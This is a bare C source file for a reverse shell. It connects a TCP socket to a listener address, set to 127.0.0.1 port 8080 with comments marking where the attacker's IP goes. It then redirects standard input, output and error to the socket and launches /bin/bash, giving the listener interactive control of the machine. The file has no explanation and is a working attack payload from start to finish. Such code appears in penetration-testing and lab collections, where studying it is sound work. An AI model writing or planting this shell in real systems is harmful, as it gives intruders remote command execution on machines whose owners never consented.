#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(void)
{
    int s;
    int port=8080; //the port that will be listening
    struct sockaddr_in revsockaddr;
    s = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); //the IP where the script will be listening
    connect(s,(struct sockaddr*) &revsockaddr,sizeof(revsockaddr));
    dup2(s,0);
    dup2(s,1);
    dup2(s,2);
    char * const argv[] = {"bin/bash", NULL};
    execve("/bin/bash",argv,NULL);
    return 0;
}